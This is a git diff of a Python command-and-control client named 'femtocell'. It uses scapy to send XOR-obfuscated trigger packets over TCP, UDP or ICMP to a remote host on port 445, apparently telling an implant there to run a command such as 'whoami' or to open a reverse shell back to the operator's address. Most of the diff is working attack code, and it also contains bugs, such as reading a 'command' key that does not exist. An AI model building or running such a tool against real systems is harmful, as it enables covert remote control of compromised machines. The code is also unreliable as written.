@@ -1,3 +1,4 @@
+from email.mime import base
 from re import A
 import scapy.all as scapy
 from prompt_toolkit import prompt
@@ -5,6 +6,7 @@ from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 # from prompt_toolkit.contrib.completers import WordCompleter
 import click
+import os
 
 """ 
 set
@@ -24,6 +26,26 @@ show
 
 """
 
+baseparams = {
+    "mode":"cmd",
+}
+
+cmdparams = {
+    "rhost": "",
+    "rport": 445,
+    "command": "whoami",
+    "lport": 6006,
+    "transport": "tcp"
+}
+
+shellparams = {
+    "rhost": "",
+    "rport": 445,
+    "lhost": "",
+    "lport": 6006,
+    "transport": "tcp"
+}
+
 def xor_encrypt(byte_msg, byte_key):
     encrypt_byte = b''
     for b in byte_msg:
@@ -31,8 +53,16 @@ def xor_encrypt(byte_msg, byte_key):
         encrypt_byte += chr(b ^ byte_key).encode()
     return encrypt_byte
 
+
 def print_help():
     print("read the fucking readme")
+
+
+def print_options(p):
+    for item in p.keys():
+        print(f"\n{item}: {p[item]}")
+    print()
+
 
 def main():
     print("""
@@ -49,16 +79,17 @@ def main():
 # cmd params
 # shell params
 
-    params = {
-        "mode":"cmd", 
-        "transport":"tcp", 
-        "lhost": "",
-        "rhost": "",
-        "lport": 6006,
-        "rport": 445,
-        "command": "whoami"
-    }
+
     # SQLCompleter = WordCompleter(['select', 'from', 'insert', 'update', 'delete', 'drop'],ignore_case=True)
+
+    if not os.path.exists("./history"):
+        os.system("mkdir history")
+
+    if not os.path.isfile("./history/main.history"):
+        os.system("touch main.history")
+
+    if not os.path.isfile("./history/cmd.history"):
+        os.system("touch cmd.history")
 
     while(True):
         user_in = prompt(u'femtocell ~ ',
@@ -68,29 +99,34 @@ def main():
                         ).split()
         # click.echo_via_pager(user_input)
 
-        
-        # user_in = input("femtocell ~ ").split()
-
         if(len(user_in) > 1):
             user_cmd = user_in[0]
             if(user_cmd == "set"):
-                params[user_in[1]] = user_in[2]
+                baseparams[user_in[1]] = user_in[2]
                 if user_in[1] == "mode":
-                    prompt2(params)
+                    if baseparams["mode"] == "shell":
+                        shellPrompt()
+                    elif baseparams["mode"] == "cmd":
+                        cmdPrompt()
             if(user_cmd == "show"):
                 if(user_in[1] == "all"):
-                    print(str(params))
+                    print(str(baseparams))
                 else:
-                    print(params[user_in[1]])
+                    print(baseparams[user_in[1]])
         elif len(user_in) == 1:
             if user_in[0] == "exit":
                 exit()
+            elif user_in[0] == "help":
+                print_help()
+            else:
+                print_help()
         else:
             print_help()
 
-def prompt2(params):
+
+def cmdPrompt():
     while True:
-        user_in = prompt(f'femtocell ({params["mode"]}) ~ ',
+        user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
                         history=FileHistory('history/cmd.history'),
                         auto_suggest=AutoSuggestFromHistory(),
                         # completer=SQLCompleter,
@@ -98,37 +134,50 @@ def prompt2(params):
         
         if user_in[0] == "exit":
             return
-
-        if params["mode"] == "shell":
-            plaintext = "FC-SH-{}\00".format(params["lhost"])
-            encrypted = xor_encrypt(plaintext.encode(), 0x10)
-        elif params["mode"] == "cmd":
-            plaintext = "FC-CM-{}\00".format(params["command"])
-            encrypted = xor_encrypt(plaintext.encode(), 0x10)
+        elif user_in[0] == "options":
+            print_options(cmdparams)
+        elif user_in[0] == "send":
+            plaintext = "FC-SH-{}\00".format(shellparams["command"]) 
+            send(plaintext)
         else:			
             continue
- 
-        if(params["transport"] == "udp"):
-            scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
-            scapy.UDP(sport=params["lport"], dport=params["rport"])/encrypted)
-        elif(params["transport"] == "tcp"):
-            scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
-            scapy.TCP(sport=params["lport"], dport=params["rport"], flags="AP")/encrypted)
-        elif(params["transport"] == "icmp"):
-            scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
-            scapy.ICMP(code=1, type=8)/encrypted)	
-
-        print(user_in)
 
 
-    # std = "FC-SH-192.168.10.162\00"
-    # encrypted = xor_encrypt(std.encode(), 0x10)
+def shellPrompt():
+    while True:
+        user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
+                        history=FileHistory('history/shell.history'),
+                        auto_suggest=AutoSuggestFromHistory(),
+                        # completer=SQLCompleter,
+                        ).split()
+        
+        if user_in[0] == "exit":
+            return
+        elif user_in[0] == "options":
+            print_options(shellparams)
+            continue
+        elif user_in[0] == "send":
+            plaintext = "FC-SH-{}\00".format(shellparams["lhost"])
+            send(plaintext) 
+        else:			
+            continue
 
-    # print(encrypted.decode())
 
-    # # scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.10.162".encode())/scapy.ICMP(code=1, type=8)/encrypted)
-    # # scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.183.1".encode())/scapy.TCP(sport=6006, dport=135, flags="AP")/encrypted)
-    # scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.183.1".encode())/scapy.UDP(sport=6006, dport=6969)/encrypted)
+def send(plaintext):
+    encrypted = xor_encrypt(plaintext.encode(), 0x10)
+    
+    if(shellparams["transport"] == "udp"):
+        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
+        scapy.UDP(sport=shellparams["lport"], dport=shellparams["rport"])/encrypted)
+    elif(shellparams["transport"] == "tcp"):
+        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
+        scapy.TCP(sport=shellparams["lport"], dport=shellparams["rport"], flags="AP")/
+        encrypted)
+    elif(shellparams["transport"] == "icmp"):
+        scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
+        scapy.ICMP(code=1, type=8)/
+        encrypted)
+
 
 if(__name__ == "__main__"):
     main()
